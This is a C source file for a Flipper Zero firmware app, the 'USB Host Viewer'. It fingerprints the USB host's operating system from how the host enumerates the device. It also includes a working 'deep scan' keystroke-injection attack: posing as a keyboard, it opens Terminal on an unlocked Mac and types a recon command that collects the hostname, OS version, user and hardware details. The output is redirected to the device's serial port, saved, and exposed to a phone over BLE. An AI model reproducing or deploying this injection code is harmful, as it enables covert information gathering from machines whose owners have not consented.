// USB Host Viewer -- the Flipper-side Scan Viewer.
//
// Opened by holding LEFT on the desktop. Two layers:
//  - PASSIVE: the host fingerprint the USB stack collected while being
//    enumerated (furi_hal_usb_get_host_fingerprint). OS guess + the raw tells.
//  - DEEP (the "Mr Robot" recon): the Flipper types a recon command into the
//    host as an HID keyboard, redirects its output back to the Flipper's own
//    serial, and captures it over the CDC -- bringing the real hostname, OS
//    version, kernel, user and hardware. Experimental: needs the host unlocked
//    with nothing else holding the Flipper's serial (no screen/qFlipper).
//
// UP/DOWN scroll, OK shows detail for a row (or runs the deep scan on the top
// row), BACK backs out. The deep result is also written to /ext/nikita/recon.txt
// so the phone can read it over BLE.
#include <furi.h>
#include <furi_hal_usb.h>
#include <furi_hal_usb_hid.h>
#include <gui/gui.h>
#include <input/input.h>
#include <storage/storage.h>
#include <cli/cli_vcp.h>

#define DEEP_ROW      0 // the "DEEP SCAN" action row
#define SIGNAL_ROWS   9
#define TOTAL_ROWS    (SIGNAL_ROWS + 1)
#define VIEWER_VISIBLE 4
#define RECON_PATH    "/ext/nikita/recon.txt"

typedef enum {
    ScreenList,
    ScreenDetail,
    ScreenDeepRunning,
    ScreenResult,
} Screen;

typedef struct {
    FuriMutex* mutex;
    Screen screen;
    int selected; // 0 = deep row, 1..9 = signals
    int top;
    int result_scroll;
    FuriString* result; // captured deep-scan text
} ViewerState;

static const char* viewer_os_name(FuriHalUsbHostOs os) {
    switch(os) {
    case FuriHalUsbHostOsWindows:
        return "Windows";
    case FuriHalUsbHostOsMacos:
        return "macOS";
    case FuriHalUsbHostOsLinux:
        return "Linux";
    default:
        return "Unknown";
    }
}

// Signal index (0..8) -> label, value, and a plain-language explanation.
static void viewer_signal(int i, char* label, size_t ll, char* value, size_t vl, const char** info) {
    FuriHalUsbHostFingerprint fp = furi_hal_usb_get_host_fingerprint();
    switch(i) {
    case 0:
        snprintf(label, ll, "OS");
        snprintf(value, vl, "%s", viewer_os_name(fp.os));
        *info = "Best-effort OS guess from HOW the host enumerated us. A device "
                "cannot read its host, so this is inferred, not read.";
        break;
    case 1:
        snprintf(label, ll, "MS-OS 0xEE");
        snprintf(value, vl, "%s", fp.ms_os_string_requested ? "yes" : "no");
        *info = "Only Windows fetches the Microsoft OS String Descriptor at "
                "string index 0xEE. yes = Windows; no = macOS or Linux.";
        break;
    case 2:
        snprintf(label, ll, "serial");
        snprintf(value, vl, "%s", fp.serial_requested ? "yes" : "no");
        *info = "Did the host read our serial-number string? macOS pulls it "
                "during enumeration; the Linux cdc_acm path usually does not.";
        break;
    case 3:
        snprintf(label, ll, "product");
        snprintf(value, vl, "%s", fp.product_requested ? "yes" : "no");
        *info = "Did the host read our product string? Together with 'serial', "
                "a strong macOS tell.";
        break;
    case 4:
        snprintf(label, ll, "manuf");
        snprintf(value, vl, "%s", fp.manuf_requested ? "yes" : "no");
        *info = "Did the host read our manufacturer string?";
        break;
    case 5:
        snprintf(label, ll, "dev desc");
        snprintf(value, vl, "%u", (unsigned)fp.device_desc_requests);
        *info = "How many times the host asked for the DEVICE descriptor. Some "
                "OSes ask twice (a short probe, then the full read).";
        break;
    case 6:
        snprintf(label, ll, "cfg desc");
        snprintf(value, vl, "%u", (unsigned)fp.config_desc_requests);
        *info = "How many times the host asked for the CONFIGURATION descriptor.";
        break;
    case 7:
        snprintf(label, ll, "strings");
        snprintf(value, vl, "%u", (unsigned)fp.string_requests);
        *info = "Total string-descriptor reads. macOS is chatty here; a minimal "
                "host asks for few.";
        break;
    case 8:
        snprintf(label, ll, "1st wLen");
        snprintf(value, vl, "%u", (unsigned)fp.first_device_desc_wlength);
        *info = "Length the host asked for on the FIRST device-descriptor read: "
                "64 points to Linux, 8 to macOS/Windows.";
        break;
    default:
        snprintf(label, ll, "-");
        snprintf(value, vl, "-");
        *info = "";
        break;
    }
}

// --- HID typing (macOS-shaped, mirrors nikita_install_macos) ---------------

static void viewer_tap(uint16_t key) {
    for(int i = 0; i < 50 && !furi_hal_hid_kb_press(key); i++) furi_delay_ms(4);
    furi_delay_ms(6);
    for(int i = 0; i < 50 && !furi_hal_hid_kb_release_all(); i++) furi_delay_ms(4);
    furi_delay_ms(6);
}

static void viewer_type(const char* text) {
    for(const char* p = text; *p; p++) {
        if(*p == '\n') {
            viewer_tap(HID_KEYBOARD_RETURN);
            furi_delay_ms(12);
            continue;
        }
        uint16_t key = HID_ASCII_TO_KEY(*p);
        if(key != HID_KEYBOARD_NONE) viewer_tap(key);
    }
}

// The active recon. macOS for now: open Terminal via Spotlight, run a batch of
// recon commands, redirect the whole batch to the Flipper's own serial, and
// capture it back over the CDC. Returns the captured text in `out`.
static void viewer_deep_scan(FuriString* out) {
    furi_string_reset(out);
    FuriHalUsbHostFingerprint fp = furi_hal_usb_get_host_fingerprint();
    if(fp.os != FuriHalUsbHostOsMacos) {
        furi_string_set(
            out,
            "Deep scan is macOS-only for now.\nThe passive guess is not macOS,\n"
            "so the recon is not run.");
        return;
    }

    cli_vcp_capture_begin();

    // Open Terminal.
    viewer_tap(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR);
    furi_delay_ms(700);
    viewer_type("Terminal");
    furi_delay_ms(600);
    viewer_tap(HID_KEYBOARD_RETURN);
    furi_delay_ms(4500);
    viewer_tap(HID_KEYBOARD_RETURN);
    furi_delay_ms(250);
    viewer_tap(HID_KEYBOARD_RETURN);
    furi_delay_ms(700);

    // Gather the facts and redirect the lot to our own serial. The glob matches
    // only the Flipper's CDC device; markers bracket the payload so we know when
    // it is complete.
    viewer_type(
        "{ echo ===NIKITA===; hostname; sw_vers; uname -a; whoami; id -un; "
        "sysctl -n hw.model; sysctl -n machdep.cpu.brand_string; "
        "echo ===END===; } > /dev/cu.usbmodemflip* 2>/dev/null\n");

    // Drain the capture until the end marker or a timeout.
    uint8_t rbuf[128];
    uint32_t deadline = furi_get_tick() + furi_ms_to_ticks(6000);
    while(furi_get_tick() < deadline) {
        size_t n = cli_vcp_capture_read(rbuf, sizeof(rbuf), 400);
        if(n) {
            for(size_t i = 0; i < n; i++) {
                char c = (char)rbuf[i];
                if(c != '\r') furi_string_push_back(out, c);
            }
            if(furi_string_search_str(out, "===END===", 0) != FURI_STRING_FAILURE) break;
        }
    }
    cli_vcp_capture_end();

    if(furi_string_empty(out)) {
        furi_string_set(
            out,
            "No output captured.\nThe host may be locked, may have\nno Terminal "
            "focused, or something\nelse is holding the serial\n(close screen/"
            "qFlipper first).");
    } else {
        // Persist so the phone can read it over BLE.
        Storage* storage = furi_record_open(RECORD_STORAGE);
        storage_common_mkdir(storage, "/ext/nikita");
        File* f = storage_file_alloc(storage);
        if(storage_file_open(f, RECON_PATH, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
            storage_file_write(f, furi_string_get_cstr(out), furi_string_size(out));
        }
        storage_file_close(f);
        storage_file_free(f);
        furi_record_close(RECORD_STORAGE);
    }
}

// --- drawing ---------------------------------------------------------------

static void viewer_draw_list(Canvas* canvas, ViewerState* state) {
    // Title bar.
    canvas_set_color(canvas, ColorBlack);
    canvas_draw_box(canvas, 0, 0, 128, 13);
    canvas_set_color(canvas, ColorWhite);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 3, 10, "VIEWER");

    canvas_set_font(canvas, FontSecondary);
    for(int r = 0; r < VIEWER_VISIBLE; r++) {
        int idx = state->top + r;
        if(idx >= TOTAL_ROWS) break;
        int y = 14 + r * 12;
        bool sel = (idx == state->selected);
        if(sel) {
            canvas_set_color(canvas, ColorBlack);
            canvas_draw_box(canvas, 0, y, 128, 12);
            canvas_set_color(canvas, ColorWhite);
        } else {
            canvas_set_color(canvas, ColorBlack);
        }
        if(idx == DEEP_ROW) {
            canvas_draw_str(canvas, 3, y + 9, "> DEEP SCAN");
            canvas_draw_str(canvas, 96, y + 9, "recon");
        } else {
            char label[16], value[16];
            const char* info;
            viewer_signal(idx - 1, label, sizeof(label), value, sizeof(value), &info);
            canvas_draw_str(canvas, 3, y + 9, label);
            uint16_t w = canvas_string_width(canvas, value);
            canvas_draw_str(canvas, 125 - w, y + 9, value);
        }
    }

    canvas_set_color(canvas, ColorBlack);
    int track_h = 51;
    int bar_h = track_h * VIEWER_VISIBLE / TOTAL_ROWS;
    int bar_y = 13 + (track_h - bar_h) * state->top / (TOTAL_ROWS - VIEWER_VISIBLE);
    canvas_draw_box(canvas, 126, bar_y, 2, bar_h);
}

// Word-wrapped multi-line text under a title bar, scrolled by `scroll` lines.
static void viewer_draw_text(Canvas* canvas, const char* title, const char* text, int scroll) {
    canvas_set_color(canvas, ColorBlack);
    canvas_draw_box(canvas, 0, 0, 128, 13);
    canvas_set_color(canvas, ColorWhite);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 3, 10, title);

    canvas_set_color(canvas, ColorBlack);
    canvas_set_font(canvas, FontSecondary);

    // Simple line layout: break on '\n', wrap on width, honour scroll.
    char line[40];
    size_t li = 0;
    int row = 0;
    int y0 = 24;
    for(const char* p = text;; p++) {
        bool flush = (*p == '\0') || (*p == '\n');
        if(!flush && li < sizeof(line) - 1) {
            line[li++] = *p;
            // Soft wrap: if the line got wide, break it here.
            line[li] = '\0';
            if(canvas_string_width(canvas, line) > 120) {
                li--;
                line[li] = '\0';
                flush = true;
                p--; // reprocess this char on the next line
            }
        }
        if(flush) {
            line[li] = '\0';
            if(row >= scroll && (row - scroll) < 4) {
                canvas_draw_str(canvas, 3, y0 + (row - scroll) * 11, line);
            }
            row++;
            li = 0;
            if(*p == '\0') break;
        }
    }
}

static void viewer_draw_callback(Canvas* canvas, void* ctx) {
    ViewerState* state = ctx;
    furi_mutex_acquire(state->mutex, FuriWaitForever);
    Screen screen = state->screen;
    int selected = state->selected;
    int scroll = state->result_scroll;
    canvas_clear(canvas);

    if(screen == ScreenList) {
        viewer_draw_list(canvas, state);
    } else if(screen == ScreenDetail) {
        char label[16], value[16];
        const char* info = "";
        if(selected >= 1) {
            viewer_signal(selected - 1, label, sizeof(label), value, sizeof(value), &info);
        } else {
            snprintf(label, sizeof(label), "DEEP SCAN");
            info = "OK runs the recon: type a command into the host and capture "
                   "its output back over the serial. Needs the host unlocked.";
        }
        viewer_draw_text(canvas, label, info, scroll);
    } else if(screen == ScreenDeepRunning) {
        viewer_draw_text(
            canvas, "DEEP SCAN",
            "Running recon...\nOpening Terminal on the host\nand capturing. Keep "
            "the host\nunlocked.",
            0);
    } else if(screen == ScreenResult) {
        viewer_draw_text(
            canvas, "RECON",
            state->result ? furi_string_get_cstr(state->result) : "(empty)", scroll);
    }

    furi_mutex_release(state->mutex);
}

static void viewer_input_callback(InputEvent* input_event, void* ctx) {
    FuriMessageQueue* queue = ctx;
    furi_message_queue_put(queue, input_event, FuriWaitForever);
}

int32_t usb_viewer_app(void* p) {
    UNUSED(p);

    FuriMessageQueue* queue = furi_message_queue_alloc(8, sizeof(InputEvent));
    ViewerState* state = malloc(sizeof(ViewerState));
    state->mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    state->screen = ScreenList;
    state->selected = 0;
    state->top = 0;
    state->result_scroll = 0;
    state->result = furi_string_alloc();

    ViewPort* view_port = view_port_alloc();
    view_port_draw_callback_set(view_port, viewer_draw_callback, state);
    view_port_input_callback_set(view_port, viewer_input_callback, queue);

    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);

    InputEvent event;
    bool running = true;
    while(running) {
        if(furi_message_queue_get(queue, &event, FuriWaitForever) != FuriStatusOk) continue;
        if(event.type != InputTypePress && event.type != InputTypeRepeat) continue;

        furi_mutex_acquire(state->mutex, FuriWaitForever);
        Screen screen = state->screen;
        bool run_deep = false;

        if(screen == ScreenList) {
            switch(event.key) {
            case InputKeyUp:
                if(state->selected > 0) state->selected--;
                if(state->selected < state->top) state->top = state->selected;
                break;
            case InputKeyDown:
                if(state->selected < TOTAL_ROWS - 1) state->selected++;
                if(state->selected >= state->top + VIEWER_VISIBLE)
                    state->top = state->selected - VIEWER_VISIBLE + 1;
                break;
            case InputKeyOk:
                if(state->selected == DEEP_ROW) {
                    state->screen = ScreenDeepRunning;
                    run_deep = true;
                } else {
                    state->result_scroll = 0;
                    state->screen = ScreenDetail;
                }
                break;
            case InputKeyBack:
                running = false;
                break;
            default:
                break;
            }
        } else { // Detail / Result / DeepRunning
            switch(event.key) {
            case InputKeyUp:
                if(state->result_scroll > 0) state->result_scroll--;
                break;
            case InputKeyDown:
                state->result_scroll++;
                break;
            case InputKeyBack:
                state->screen = ScreenList;
                state->result_scroll = 0;
                break;
            default:
                break;
            }
        }
        furi_mutex_release(state->mutex);
        view_port_update(view_port);

        if(run_deep) {
            // Runs the recon (blocks a few seconds; the "Running" screen is
            // already shown). Then switch to the result.
            FuriString* out = furi_string_alloc();
            viewer_deep_scan(out);
            furi_mutex_acquire(state->mutex, FuriWaitForever);
            furi_string_set(state->result, furi_string_get_cstr(out));
            state->screen = ScreenResult;
            state->result_scroll = 0;
            furi_mutex_release(state->mutex);
            furi_string_free(out);
            view_port_update(view_port);
        }
    }

    view_port_enabled_set(view_port, false);
    gui_remove_view_port(gui, view_port);
    furi_record_close(RECORD_GUI);
    view_port_free(view_port);
    furi_string_free(state->result);
    furi_mutex_free(state->mutex);
    free(state);
    furi_message_queue_free(queue);
    return 0;
}
